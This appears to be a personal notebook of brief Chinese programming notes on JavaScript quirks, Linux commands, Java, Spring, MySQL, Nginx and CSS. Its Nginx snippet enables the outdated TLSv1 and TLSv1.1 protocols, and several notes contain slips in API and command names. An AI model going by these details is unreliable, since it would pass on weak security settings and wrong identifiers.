怎么判断两个数的顺序的，比如31和3; 那么我们可以让它们以字符形式分别进行交叉相加，如'331' 和'313',然后根据字符大小规则进行比对
然后再使用join 函数将数组组成我们要的结果
--------------------------------------------------------------------------------------
一个参数(x): 返回1970-01-01加上x毫秒的时间
--------------------------------------------------------------------------------------
[1,2,3] === [1,2,3] // false
{a: 1} === {a: 1}   // false
{} === {}           // false
[10] ==  10      // 为 true
--------------------------------------------------------------------------------------
禁用 SSL 3.0 加密协议，防止TLS 1.2 或者 TLS 1.1 或者 TLS 1.0降级到 SSL 3.0 加密协议
Nginx 隐性默认是SSLv3 TLSv1 TLSv1.1 TLSv1.2。

ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
--------------------------------------------------------------------------------------
hibernate
@Enumerated(EnumType.ORDINAL)
@Column(name = "type")
public Type type;
@Enumerated 可选 value 属性有 ORDINAL 和 STRING
EnumType.ORDINAL：要求被映射的数据库字段类型为整形
修改了枚举类型的定义会造成数据库中的数据无法被加载
--------------------------------------------------------------------------------------
Greenplum 一个关系型数据库集群 MPP架构
Greenplum采用Postgresl作为底层引擎
无共享架构
强大的并行数据计算性能和海量数据管理能力
主要由master host，segment host，interconnect三大部分组成
greenplum中每个表都是分布在所有节点上的 master host不存放任何用户数据，只是对客户端进行访问控制和存储表分布逻辑的元数据
Greenplum的并行处理主要体现在外部表并行装载，并行备份恢复与并行查询处理
--------------------------------------------------------------------------------------
MySQL的between是包含两边的边界值的，等价于「min <=expr AND expr <= max」
not between」是对「between」的取反，则不包含边界值，等价于「expr < min OR expr > max」
--------------------------------------------------------------------------------------
通过代理层实现数据库读写分离Amoeba
--------------------------------------------------------------------------------------
TokuDB引擎
TokuDB的优点：1、高压缩比 2、高insert性能 3、增删字段秒级。
TokuDB的缺点：1、cpu usr态消耗高 2、响应时间变长。
--------------------------------------------------------------------------------------
屏蔽chrome自动填充表单
<input type="password" style="width: 1px; height: 1px; position: absolute; border: 0px; padding: 0px;">
<input id="password" type="password" placeholder="Password" autocomplete="new-password">
--------------------------------------------------------------------------------------
https://limonte.github.io/sweetalert2/ 是一个颜值很高而且可以自定义的警告弹出窗口插件，可以代替Javascript的弹出窗口
--------------------------------------------------------------------------------------
switch 语句中的case是执行 === 判断而不是 == 所以需要注意类型
new Boolean(false) 是等于true的
let声明的变量不存在“变量提升”现象。
console.log(x); // undefined
let x = 10;
--------------------------------------------------------------------------------------
http://kazzkiq.github.io/balloon.css/ 一款非常小巧的提示框组件
http://basscss.com/ 轻量级的 CSS 基本元素样式、工具、颜色和布局模块
--------------------------------------------------------------------------------------
1<2<3,3<2<1
1<2=>true;
true<3=>1<3=>true;
3<2=>false;
false<1=>0<1=>true;
--------------------------------------------------------------------------------------
var name = 'World!';
(function () {
    if (typeof name === 'undefined') {
        var name = 'Jack';
        console.log('Goodbye ' + name);
    } else {
        console.log('Hello ' + name);
    }
})();
Goodbye Jack
--------------------------------------------------------------------------------------
var a = [0];
if ([0]) {
  console.log(a == true);
} else {
  console.log("wut");
}
false

[0]被看做Boolean是被认为是true 但用作比较的时候它是false
[0]==true
false
--------------------------------------------------------------------------------------
[,,,].join(", ") 长度为三的稀疏数组
 ", , "
--------------------------------------------------------------------------------------
$("#tableData tbody tr").each(function(i,n){
   if($(this).find("td:nth-child(4)").text()>0){
     $(this).find("td:last").append(' '+ '<i class="fa fa-long-arrow-up" style="color:red;"></i>');
   }else{
     $(this).find("td:last").append(' '+ '<i class="fa fa-long-arrow-down" style="color:#03a403;"></i>');
   }

  })
--------------------------------------------------------------------------------------
Promise
.race([A,B,C])最快的
--------------------------------------------------------------------------------------
185.31.16.184 github.global.ssl.fastly.net
--------------------------------------------------------------------------------------
尾调用
function f(x) {
  return g(x)
}
在 f 函数中，最后一步操作是调用 g 函数，并且调用 g 函数的返回值被 f 函数直接返回

尾递归
function fibonacciTail(n, a = 0, b = 1) {
  if (n === 0) return a
  return fibonacciTail(n - 1, b, a + b)
}

function fibonacciLoop(n, a = 0, b = 1) {
  while (n--) {
    [a, b] = [b, a + b]
  }
  return a
}

蹦床函数
接受一个函数作为参数，在蹦床函数内部执行函数，如果函数的返回是也是一个函数，就继续执行
function trampoline(f) {
  while (f && f instanceof Function) {
    f = f()
  }
  return f
}

function fibonacciFunc(n, a = 0, b = 1) {
  if (n > 0) {
    [a, b] = [b, a + b]
    return fibonacciFunc.bind(null, n - 1, a, b)
  } else {
    return a
  }
}

function tailCallOptimize(f) {
  let value,
      active = false
  const accumulated = []
  return function accumulator() {
    accumulated.push(arguments)
    if (!active) {
      active = true
      while (accumulated.length) {
        value = f.apply(this, accumulated.shift())
      }
      active = false
      return value
    }
  }
}

const fibonacciTail = tailCallOptimize(function(n, a = 0, b = 1) {
  if (n === 0) return a
  return fibonacciTail(n - 1, b, a + b)
})
fibonacciTail(5)

单独的函数调用不是尾调用
function foo() {
  bar()
}
--------------------------------------------------------------------------------------
Object.getOwnProperty
用于返回对象的自有属性，包括可枚举和不可枚举的

Object.keys
返回一个数组，元素均为对象自有的可枚举属性
--------------------------------------------------------------------------------------
jquery ajax
默认的话，traditional为false，即jquery会深度序列化参数对象
设置traditional 为true阻止深度序列化，然后序列化结果如下：
p: ["123", "456", "789"]    =>    p=123&p=456&p=456

var values = $("input[type=checkbox]").map(function(){
      return $(this).val();
}).get();
$.ajax{
      url:"xxxx",
      traditional: true,
      data:{
            p: values
      }
}
--------------------------------------------------------------------------------------
console.log(Object.prototype._proto_) null
原型链的形成是真正是靠 _proto _ 的，而不是 prototype。
所有的原型对象都有 constructor 属性，该属性对应创建所有指向该原型的实例构造函数。
函数对象和原型对象通过 prototype 和 constructor 属性进行相互关联
--------------------------------------------------------------------------------------
如果 NOT IN 子查询中返回的任意一条记录含有空值，则查询将不返回任何记录
--------------------------------------------------------------------------------------
function fn1(){
    return {
        name: 'javascript'
    };
}

function fn2(){
    return
    {
        name: 'javascript'
    };
}

var obj1 = fn1();
var obj2 = fn2();

console.log(obj1); object类型的数据
console.log(obj2); undefined

JavaScript是不需要分号这个东西的，所以第二个函数其实会被解析成
function fn2(){
    return ;
    {
        name: 'javascript'
    };
}

--------------------------------------------------------------------------------------
var length = 10;
function fn() {
    console.log(this.length)
};
var obj = {
    length: 5,
    method: function (fn) {
        fn(); //10 window
        arguments[0](); //2  arguments length属性
        fn.call(obj, 12); //5 显示绑定obj
    }
};
obj.method(fn, 1);
--------------------------------------------------------------------------------------
禁止eclipse校验JavaScript
解决方法
打开项目的.project文件，删除如下这两段xml，问题解决。

<buildCommand>
    <name>org.eclipse.wst.jsdt.core.javascriptValidator</name>
    <arguments>
    </arguments>
</buildCommand>
<nature>org.eclipse.wst.jsdt.core.jsNature</nature>
--------------------------------------------------------------------------------------
https://segmentfault.com/a/1190000007920475 window工具
--------------------------------------------------------------------------------------
nohup 的用途就是让提交的命令忽略 hangup 信号
当用户注销（logout）或者网络断开时，终端会收到 HUP（hangup）信号从而关闭其所有子进程

只需在要处理的命令前加上 nohup 即可，标准输出和标准错误缺省会被重定向到 nohup.out 文件中
nohup ./myprogram > foo.out 2> foo.err &

>/dev/null 2>&1
>  默认时把标准输出重定向
2>&1 时把出错输出也定向到标准输出
综合就是把标准输出和出错处理都放到回收站

>>”追加操作符
#关闭所有输出
ls test.sh test1.sh  1>&- 2>&-
--------------------------------------------------------------------------------------
exec绑定重定向
exec 6>&1  #将标准输出与fd 6绑定
ls  /proc/self/fd/
exec 1>suc.txt #将接下来所有命令标准输出，绑定到suc.txt文件（输出到该文件）
ls -al #执行命令，发现什么都不返回了，因为标准输出已经输出到suc.txt文件了
exec 1>&6 #恢复标准输出
exec 6>&- #关闭fd 6描述符
--------------------------------------------------------------------------------------
Executor executor = new ForkJoinPool(20);

List<CompletableFuture<Integer>> tasks = new ArrayList<>();
IntStream.rangeClosed(1, jobCount).forEach(value -> tasks.add(CompletableFuture.supplyAsync(Main::getJob, executor)));
--------------------------------------------------------------------------------------
Spring MVC过滤器-委派过滤器代理（DelegatingFilterProxy）
<filter>
    <filter-name>testFilter</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    <init-param>
        <param-name>targetBeanName</param-name>
        <param-value>testBean</param-value>
    </init-param>
</filter>
       <filter-mapping>
    <filter-name>testFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
含义是有一个过滤器，它指向一个bean，这个bean在spring中的名字为testBean，testBean实现javax.servlet.Filter

targetFilterLifecycle，是否调用Filter的init和destroy方法，默认为false

<filter>
    <filter-name>permission</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    <init-param>
        <param-name>targetBeanName</param-name>
        <param-value>Spring-bean-name</param-value>
    </init-param>
</filter>
也就是增加一个"targetBeanName"的参数，值为实际执行Filter的bean

--------------------------------------------------------------------------------------
//函数声明
function Foo() {
    //全局变量
    getName = function () {
        console.log('1');
    };
    return this;
}
//为函数添加属性getName,其类型是Function，所以这里也可以看出来，Function也是一种Object
Foo.getName = function () {
    console.log('2');
};
//为Foo的原型添加方法getName
Foo.prototype.getName = function () {
    console.log('3');
};
var getName = function () {
    console.log('4');
};
function getName() {
    console.log(5);
}

Foo.getName(); 2  函数Foo本身并没有执行，执行的是函数的属性getName
getName(); 4    全局范围内执行了getName()
Foo().getName(); 1  ()与.优先级相同 运行Foo(),全局的getName被覆盖成输出console.log('1'),
并且返回的this此时代表的是window。随后相当于执行的window.getName()
getName(); 1
new Foo.getName(); 2  .操作符要比new优先级要高 new (Foo.getName)()
new Foo().getName(); 3  (new Foo()).getName(); 带参数的new操作符是优先级最高的
new new Foo().getName();  3
第一步划分为：
new (new Foo().getName)();
第二步划分为：
new ((new Foo()).getName)();

var getName = function () {
    console.log('4');
};
function getName() {
    console.log(5);
}
getName(); 4
var声明的变量和函数声明function都会被提升，但是函数声明的提升的级别是比var要高的
--------------------------------------------------------------------------------------
document.domain只能适用于主域相同子域不同的情况
只能把document.domain设置成自身或更高一级的父域，且主域必须相同 只能在主域相同且子域不同的情况下使用
--------------------------------------------------------------------------------------
提前把 所有存在的路径中的子组合 算出来，算法上叫取集合所有子集，数学上叫 幂集， 形成一个所有存在的路径表
幂集算法的时间复杂度是 O(2^n)
--------------------------------------------------------------------------------------
var options = {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ username: 'admin', password: 'root' }),
    credentials: 'include'
  };

fetch('/api', options).then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.log('Oops, error: ', error))

Fetch 请求默认是不带 cookie，需要设置 fetch(url, {credentials: 'include'})`
服务器返回 400，500 错误码时并不会 reject，只有网络错误这些导致请求不能完成时，fetch 才会被 reject
--------------------------------------------------------------------------------------
Webp 是一种支持有损压缩和无损压缩的图片文件格式，派生自图像编码格式 VP8
function checkWebpSupport() {
  const canvas = document.createElement('canvas');
  if (Boolean(canvas.getContext && canvas.getContext('2d'))) {
    return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
  }
  return false;
}
--------------------------------------------------------------------------------------
可执行
<plugin>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-maven-plugin</artifactId>
    <configuration>
        <executable>true</executable>
    </configuration>
</plugin>
--------------------------------------------------------------------------------------
推荐
<meta charset='utf-8'>

站点适配
主要用于PC-手机页的对应关系。
<meta name="mobile-agent"content="format=[wml|xhtml|html5]; url=url">
<!--
[wml|xhtml|html5]根据手机页的协议语言，选择其中一种；
url="url" 后者代表当前PC页所对应的手机页URL，两者必须是一一对应关系。
-->
<meta name="mobile-agent" content="format=html5;url=http://3g.sina.com.cn/">

转码申明

用百度打开网页可能会对其进行转码，避免转码可添加如下meta。
<meta http-equiv="Cache-Control" content="no-siteapp" />

忽略数字自动识别为电话号码
<meta content="telephone=no" name="format-detection" />
忽略识别邮箱
<meta content="email=no" name="format-detection" />
--------------------------------------------------------------------------------------
date "+%Y-%m-%d %H:%M:%S" 按照格式显示当前日期
date -s "xxx xx：xx：xx" 设置系统时间

查看时区
date "+%Z"

linux的时间同步
utpdate 时间服务器ip

ntpdate -u ntp.api.bz

将系统时间写入到硬件
clock -w
--------------------------------------------------------------------------------------
fastjson
private ValueFilter filter = new ValueFilter() {
    public Object process(Object obj, String s, Object v) {
    if(v==null)
        return "";
    return v;
    }
};
JSON.toJSONString(jsonMap, filter)

QuoteFieldNames———-输出key时是否使用双引号,默认为true
WriteMapNullValue——–是否输出值为null的字段,默认为false
WriteNullNumberAsZero—-数值字段如果为null,输出为0,而非null
WriteNullListAsEmpty—–List字段如果为null,输出为[],而非null
WriteNullStringAsEmpty—字符类型字段如果为null,输出为”“,而非null
WriteNullBooleanAsFalse–Boolean字段如果为null,输出为false,而非null
JSONObject.toJSONString(Object object, SerializerFeature... features)
--------------------------------------------------------------------------------------
[mysqld]
bind-address= IP（此IP为需要绑定的IP地址）
--------------------------------------------------------------------------------------
#1，日志输入到控制台
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.Encoding=utf-8
log4j.appender.stdout.Threshold=ALL
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%-5p\: %d{ISO8601}\: %C{1}[line\:%L}\: %m%n
--------------------------------------------------------------------------------------
height:auto !important;
height:200px;
min-height:200px;
--------------------------------------------------------------------------------------
使用扩展运算符（...）拷贝数组
const itemsCopy = [...items];

function concatenateAll(...args) {
  return args.join('');
}
--------------------------------------------------------------------------------------
“包含”或者“仅包含”某些商品的订单的方法
goods表和order表都增加了一个字段：bit。
先说goods表中的bit，该字段表示对商品编码，取值为2的n次方（n>=0），假设goods表有5个商品，那么bit值依次为1、2、4、8、16、32.
再说order表中的bit，该字段表示该订单所包含商品的bit值之和，假设某订单包含bit值为1和2的商品，那么其bit为3.
假设“商品1”的bit为1，“商品2”的bit为2，那么查询包含“商品1”和“商品2”的订单的sql如下：
SELECT * from `order` where bit & 3 = 3

包含“商品1”或“商品2”
SELECT * from `order` where bit & 3 > 0

仅包含“商品1”和“商品2”
SELECT * from `order` where bit = 3

仅包含“商品1”或“商品2”
SELECT * from `order` where bit & (bit - 1) =0 and bit & 3 != 0
bit & (bit -1) = 0 保证订单中只有一个商品
--------------------------------------------------------------------------------------
.text-slice {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3;
      overflow: hidden;
      text-overflow: ellipsis;
}
限制默认最多显示三行

.fake-content {
    position: absolute;
    z-index: -1; /* 隐藏 */
    opacity: 0; /* 透明 */
    pointer-events: none; /*元素不可交互/点击*/
  }

<p class="fake-content text-slice">

  function hasTextSliced($ele) {
         var initHeight = $ele.height();
         var height;
         $ele.removeClass('text-slice'); // 删除截断样式
         height = $ele.height();

         if (initHeight < height) {
             // 发生截断
             return true;
         }

         return false;
     }
--------------------------------------------------------------------------------------
Sqluldr2：专业用于大数据量导出工具
Sqlldr：专业用于导入的工具

用0x06来当作换行符
sqluldr2 scott/tiger sql=emp.sql record=0x06

load data
INFILE * "STR X'06'"
--------------------------------------------------------------------------------------
查看当前系统进程的uid,pid,stat,pri, 以uid号排序.
ps -eo pid,stat,pri,uid –sort uid

-A 显示所有进程
-e 此参数的效果和指定"A"参数相同
-o 用户自定义格式
--------------------------------------------------------------------------------------
稀疏文件（Sparse File）
稀疏文件区别在于文件中的部分数据是全0，且这部分数据不占用磁盘空间

dd if=/dev/zero of=sparse-file bs=1 count=1 seek=1024k
if =输入文件
of =输出文件
bs = bytes 同时设置读/写缓冲区的字节数
count = blocks 只拷贝输入的blocks块
seek=块数目：先略过以obs为单位的指定<块数目>的输出数据

创建一个100M的空文件
dd if=/dev/zero of=hello.txt bs=100M count=1

文件系统存储稀疏文件时，inode索引节点中，只给出实际占用磁盘空间的Block 号，
数据全零且不占用磁盘空间的文件Block并没有物理磁盘Block号

Linux稀疏文件inode数据块存储
文件空洞部分不占用磁盘空间
文件所占用的磁盘空间仍然是连续的
--------------------------------------------------------------------------------------
Merkle Tree 是一种数据结构
Merkle树的主要用途是确保从对等网络中接收的数据块未受损和未改变，和检查其他对等网络没有撒谎发送假数据块

比特币 Merkle树用处是检查块中是否包含指定的交易
--------------------------------------------------------------------------------------
服务器关闭时候，调ehcache的shutdown方法 存疑?
<listener>
   <listener-class>net.sf.ehcache.constructs.web.ShutdownListener</listener-class>
</listener>

public void setServletContext(ServletContext servletContext) {
     System.setProperty(net.sf.ehcache.CacheManager.ENABLE_SHUTDOWN_HOOK_PROPERTY,"true");
}
--------------------------------------------------------------------------------------
axis
Message inMsg = MessageContext.getCurrentContext().getRequestMessage();
System.out.println(inMsg == null?"null":inMsg.getSOAPPartAsString());
System.out.println("Test Success……");

Message outMsg = MessageContext.getCurrentContext().getResponsetMessage();
System.out.println(outMsg == null?"null":outMsg .getSOAPPartAsString());
System.out.println("Test Success……");
--------------------------------------------------------------------------------------
<plugin>
     <groupId>org.apache.maven.plugins</groupId>
     <artifactId>maven-resources-plugin</artifactId>
     <configuration>
       <nonFilteredFileExtensions>
         <nonFilteredFileExtension>p12</nonFilteredFileExtension>
         <nonFilteredFileExtension>jks</nonFilteredFileExtension>
    </nonFilteredFileExtensions>
  </configuration>
</plugin>
--------------------------------------------------------------------------------------
若hint是string，则先toString再valueOf；其他情况，则先valueOf再toString
[]来说，是先valueOf再toString，得到的结果是""，所以[]==false是true
!![]来说，根据规范相当于!!(toBoolean([]))，而toBoolean([])为true，所以!![]是true

[1] + [2] - [3] === 9;  // true ,相当于“12” - 3 ，先toString，然后'-'会调用toNumber
[1] + [2] === "12";  // true
--------------------------------------------------------------------------------------
去重
function unique(arr){
    var set = new Set(arr);
    return Array.from(set);
}
--------------------------------------------------------------------------------------
'[object Object]' == {}  {}进行ToPrimitive运算后，得到的是'[object Object]'字符串
--------------------------------------------------------------------------------------
解构
const obj = { foo: 123 };
const {writable, configurable} = Object.getOwnPropertyDescriptor(obj, 'foo');
console.log(writable, configurable); // true true

const [all, year, month, day] =
    /^(\d\d\d\d)-(\d\d)-(\d\d)$/
    .exec('2999-12-31');

function f() {
  return [1, 2, 3];
}

let [a, , b] = f();
console.log(a); // 1
console.log(b); // 3

剩余模式,将数组剩余部分赋值给一个变量。
let [a, ...b] = [1, 2, 3];
console.log(a); // 1
console.log(b); // [2, 3]

const arr = ['a', 'b'];
for (const [index, element] of arr.entries()) {
    console.log(index, element);
}
// Output:
// 0 a
// 1 b

const obj = { a: [{ foo: 123, bar: 'abc' }, {}], b: true };
const { a: [{foo: f}] } = obj; // f = 123

Object(undefined)
{}
Object(null)
{}

const {foo: x=3, bar: y} = {}; // x = 3; y = undefined

当解构模式有匹配结果，且匹配结果是 undefined 时，也会使用默认值作为返回结果：
const [x=1] = [undefined]; // x = 1
const {prop: y=2} = {prop: undefined}; // y = 2

const [x=3, y=x] = [];     // x=3; y=3
const [x=3, y=x] = [7];    // x=7; y=7
const [x=3, y=x] = [7, 2]; // x=7; y=2

[a, b, c] = [c, a, b];

变量值交换
var a = 1,
    b = 2;
a = [b, b = a][0];
console.log(a);  // 2
console.log(b);  // 1
--------------------------------------------------------------------------------------
Web页面实现监听用户复制后，在剪切板加入版权信息
function setClipboardText(event){
            event.preventDefault();
            var node = document.createElement('div');
            node.innerHTML=window.getSelection(0).toString();
            var htmlData = '<div>'
                            + node.innerHTML
                            + '</div>';
            var textData = ''
                            + window.getSelection(0).toString();
            if(event.clipboardData){
                event.clipboardData.setData("text/html", htmlData);
                event.clipboardData.setData('text/plain', textData);
            }
            else if(window.clipboardData){
                return window.clipboardData.setData("text", textData);
            }
};

document.addEventListener('copy', function(event){
    setClipboardText(event);
});
--------------------------------------------------------------------------------------
https://github.com/wen866595/MyBatis-batch
--------------------------------------------------------------------------------------
负载均衡又分为四层负载均衡和七层负载均衡。四层负载均衡工作在OSI模型的传输层，
主要工作是转发，它在接收到客户端的流量以后通过修改数据包的地址信息将流量转发到应用服务器

七层负载均衡工作在OSI模型的应用层  七层负载均衡的主要工作就是代理
七层负载均衡会与客户端建立一条完整的连接并将应用层的请求流量解析出来，再按照调度算法选择一个应用服务器
，并与应用服务器建立另外一条连接将请求发送过去
--------------------------------------------------------------------------------------
var arg = arg || "default";
// arg 为 undefined, null, "", 0, false, NaN 时最后都得到"default"
--------------------------------------------------------------------------------------
function hello ( msg ){
  console.log("hello")
}

Function.prototype.toString这个原型方法可以帮助你获得函数的源代码
console.log( hello.toString() );

--------------------------------------------------------------------------------------
switch js
function getDrink(type) {
    var drinks = {
        'coke': function() {
            return 'Coke';
        },
        'pepsi': function() {
            return 'Pepsi';
        },
        'lemonade': function() {
            return 'Lemonade';
        },
        'default': function() {
            return 'Default item';
        }
    };
    return (drinks[type] || drinks['default'])();
}
--------------------------------------------------------------------------------------
狭义的堆外内存 java.nio.DirectByteBuffer在创建的时候分配的内存
Class clz = Class.forName("java.nio.Bits");
maxDirectedMemoryField = clz.getDeclaredField("maxMemory");
maxDirectedMemoryField.setAccessible(true);
reservedDirectedMemoryField = clz.getDeclaredField("reservedMemory");
reservedDirectedMemoryField.setAccessible(true);
单位是bytes
maxMemoryValue = (Long)maxDirectedMemoryField.get(null);
reservedMemoryValue = (Long)reservedDirectedMemoryField.get(null);
--------------------------------------------------------------------------------------
netty
专门开一个线程池，来专门处理耗时业务
static final EventExecutorGroup group = new DefaultEventExecutorGroup(16);
ChannelPipeline pipeline = ch.pipeline();
pipeline.addLast(group, "handler", new MyBusinessLogicHandler());

future = ctx.executor().scheduleAtFixedRate(new Runnable() {
            public void run() {
            }
        }, 6, 6, TimeUnit.HOURS);

--------------------------------------------------------------------------------------
Map<Integer, String> map = new LinkedHashMap<Integer, String>() {
			private static final long serialVersionUID = 1L;

			protected boolean removeEldestEntry(Map.Entry<Integer, String> eldest) {
				return this.size() > 3;
			}
		};

//guava一个非阻塞的队列,当队列长度满了后,自动移除头元素
EvictingQueue<String> queue = EvictingQueue.create(3);

//commons-collections 循环队列:CircularFifoQueue
CircularFifoQueue<String> que = new CircularFifoQueue<String>(3);
// 只读队列 视图
Queue<String> readOnlyQue = UnmodifiableQueue.unmodifiableQueue(que);

Queue<String> pageQueue = new LinkedList<String>() {
			private static final long serialVersionUID = -6707803882461262867L;
			public boolean add(String object) {
				boolean result;
				if (this.size() <3)
					result = super.add(object);
				else {
					super.removeFirst();
					result = super.add(object);
				}
				return result;
			}
		};

--------------------------------------------------------------------------------------
iostat用于输出CPU和磁盘I/O相关的统计信息
iostat -x 1 10
1 10表示，数据显示每隔1秒刷新一次，共显示10次
-x    输出扩展信息
%util：在统计时间内所有处理IO时间，除以总共统计时间 暗示了设备的繁忙程度
await：每一个IO请求的处理的平均时间

iostat -d -k 2
-d 表示，显示设备（磁盘）使用状态；-k某些使用block为单位的列强制使用Kilobytes为单位；2表示，数据显示每隔2秒刷新一次
-c 获取cpu部分状态值

iostat -c 1 10 #查看cpu状态

avg-cpu段:
%user: 在用户级别运行所使用的CPU的百分比.
%nice: nice操作所使用的CPU的百分比.
%sys: 在系统级别(kernel)运行所使用CPU的百分比.
%iowait: CPU等待硬件I/O时,所占用CPU百分比.
%idle: CPU空闲时间的百分比.
Device段:
tps: 每秒钟发送到的I/O请求数.
Blk_read /s: 每秒读取的block数.
Blk_wrtn/s: 每秒写入的block数.
Blk_read:   读入的block总数.
Blk_wrtn:  写入的block总数.

--------------------------------------------------------------------------------------
具有时间戳或者自增长列的绝对历史数据表 只有插入操作没有删除或者修改操作
1第一次加载动作完成之后，记录一下最大的时间点，保存到一个加载记录表中。
2从第二次加载开始先比较上次操作保存的最后/最大的时间点，只加载这个时间点以后的数据。
3当加载过程全部成功完成之后再更新加载记录表，更新这次最后的时间点

有修改时间特征的数据表 UpdateDate>=CreateDate
1 UpdateDate 时间戳，保存到一个加载记录表中。(第一次是 2010-10-23)
2在第二次加载数据的时候，用加载记录表中的时间戳与源表里的 UpdateDate 相比较，
比时间戳大的说明是新添加的或者修改的数据。
3当整个加载过程成功之后，更新最大的 UpdateDate到记录表中。(记录表中将 2010-10-26 记录下来)
--------------------------------------------------------------------------------------
FormData
XMLHttpRequest Level2添加了一个新的接口FormData 增加了ajax对二进制文件上传的支持
var formData = new FormData();
formData.append("username", "sam");
// HTML file input, chosen by user
formData.append("userfile", fileInputElement.files[0]);
// JavaScript file-like object
var content = '<a id="a"><b id="b">hey!</b></a>'; // the body of the new file...
var blob = new Blob([content], { type: "text/xml"});
formData.append("webmasterfile", blob);
var request = new XMLHttpRequest();
request.open("POST", url);
request.send(formData);
--------------------------------------------------------------------------------------
http://podio.github.io/jquery-mentions-input/ @功能
--------------------------------------------------------------------------------------
*.less(不包括*.global.less)
/(?<!global)\.less$/
js中并没有实现(?<=exp)和(?<!exp)的位置匹配
/^(.(?!\.global))+\.less$/
--------------------------------------------------------------------------------------

https://github.com/anylogic/alogic/blob/master/alogic-doc/alogic-common/xscript2.md
--------------------------------------------------------------------------------------
指定时区
java -Duser.timezone=GMT+8

linux下验证码无法显示
System.setProperty(“java.awt.headless”, “true”);
--------------------------------------------------------------------------------------
FUNCTION nw.getchildlinelist (rootId VARCHAR(100))
RETURNS VARCHAR(1000)
BEGIN
    DECLARE pTemp VARCHAR(1000);
       DECLARE cTemp VARCHAR(1000);

       SET pTemp = '';
       SET cTemp = rootId;

       WHILE cTemp is not null DO
       if (pTemp = '') then
         SET pTemp = cTemp;
         elseif(pTemp <> '') then
         SET pTemp = concat(pTemp,',',cTemp);
         end if;
         SELECT group_concat(line_id) INTO cTemp FROM main_line
         WHERE FIND_IN_SET(pline_id,cTemp)>0;
       END WHILE;
       RETURN pTemp;
END
--------------------------------------------------------------------------------------
https://github.com/vmware/tungsten-replicator 高性能、开源的数据复制引擎 支持跨数据库系统的复制
--------------------------------------------------------------------------------------
判断是否在iframe中
//方式一
if (self.frameElement && self.frameElement.tagName == "IFRAME") {
         alert('在iframe中');
}
//方式二
if (window.frames.length != parent.frames.length) {
         alert('在iframe中');
}
--------------------------------------------------------------------------------------
sudo lsof -i -P -n | grep LISTEN
-i 用以显示符合条件的进程情况
-n 不将IP转换为hostname
-P 此参数禁止将port number转换为service name,预设为转换

查看22端口现在运行的情况
使用-i:port来显示与指定端口相关的网络信息
lsof -i :22

监控文件系统 哪些进程打开了文件
lsof /data/

递归查看某个目录的文件信息
lsof +D /filepath/filepath2/

查看该进程打开的文件
lsof -p 2064

列出某个程序所打开的文件信息
lsof -c mysql -c apache 以mysql开头的程序的文件

--------------------------------------------------------------------------------------
https://github.com/tywo45/talent-aio 基于java aio实现的即时通讯框架
--------------------------------------------------------------------------------------
utf-8 非最短形式
16进制        2进制
1个字节表示    0x2F         00101111
2个字节表示    0xC0AF       11000000 10101111
3个字节表示    0xE080AF     11100000 10000000 10101111
4个字节表示    0xF08080AF   11110000 10000000 10000000 10101111

非最短形式的安全隐患
在安全检查时并未将UTF-8非最短形式编码的字符
看作是 “/”正常字符，但是后续的处理中又将传入非最短形式编码的字符的0xC0AF看作”/”处理
--------------------------------------------------------------------------------------
varnish是一款高性能且开源的方向代理服务器和HTTP加速器
Varnish采用了“Visual Page Cache”技术，在内存的利用上，Varnish比Squid具有优势，
它避免了Squid频繁在内存、磁盘中交换文件，性能要比Squid高
通过Varnish管理端口，可以使用正则表达式快速、批量地清除部分缓存
varnish是一个轻量级的cache和反向代理软件

1、基于内存进行缓存，重启后数据将消失。
2、利用虚拟内存方式，I\O性能好。
3、支持设置0~60秒的精确缓存时间。
--------------------------------------------------------------------------------------
字体类型
serif(衬线)
sans-serif(无衬线)
monospace(等宽)
fantasy(梦幻)
cuisive(草体)

serif -- 衬线字体
衬线的意思是在字符笔画末端有叫做衬线的小细节的额外装饰，而且笔画的粗细会有所不同，这些细节在大写字母中特别明显
宋体（SimSun） Times New Roman

sans-serif -- 无衬线字体
专指西文中没有衬线的字体，与汉字字体中的黑体相对应
微软雅黑 华文黑体 华文细黑 黑体-简（Heiti SC）冬青黑体（Hiragino Sans GB）
Helvetica、Helvetica Neue

monospace -- 等宽字体
等宽字体是指字符宽度相同的电脑字体，常见于 IDE 或者编辑器中
Consolas(等宽的字体，属无衬线字体)

body {
    font-family: tahoma, arial, 'Hiragino Sans GB', '\5b8b\4f53', sans-serif;
}
--------------------------------------------------------------------------------------
https://necolas.github.io/normalize.css/ Normalize.css reset css
--------------------------------------------------------------------------------------
跨毫秒时，序列号总是归0，会使得序列号为0的ID比较多，导致生成的ID取模后不均匀。
解决方法是，序列号不是每次都归0，而是归一个0到9的随机数
--------------------------------------------------------------------------------------
缺省参数，arguments和参数是隔离开的；如果传入参数，arguments和参数是双向绑定的
在严格模式下，无论参数是否缺省，arguments和参数都是隔离开的
function b4(x) {
    'use strict';
    arguments[0] = 2;
    console.log(x, arguments[0]);
}
b4(1); // 1 2
--------------------------------------------------------------------------------------
curl -i http://www.a.com #加-i参加可返回头信息，更多命令可查看帮助文档
--------------------------------------------------------------------------------------
Tomcat的Parallel Deployment特性，可以同时部署应用的多个版本，而且请求的path保持一致
对于部署新版本之后到达的请求，默认会使用新版本来处理，对于旧的请求，由于session中已经包含请求数据，所以会继续处理，直到完成
新版本应用的应用名称后加两个 # ，再加上版本号即可。例如
foo## 1.0.war

--------------------------------------------------------------------------------------
Map hashMap=new HashMap();
hashMap.put( new BouncyCastleProvider(), "provoder1");
hashMap.put( new BouncyCastleProvider(), "provoder2");
System.out.println(hashMap.size()); //输出是1

//PUT时判断两个KEY是否相等用的是==
Map identityMap=new IdentityHashMap();
identityMap.put( new BouncyCastleProvider(), "provoder1");
identityMap.put( new BouncyCastleProvider(), "provoder2");
System.out.println(identityMap.size()); //输出是2

 java.security.Provider的hashCode和equals方法是有做特殊处理的,在provider中，只要密钥相等，两个Provider的比较是相等

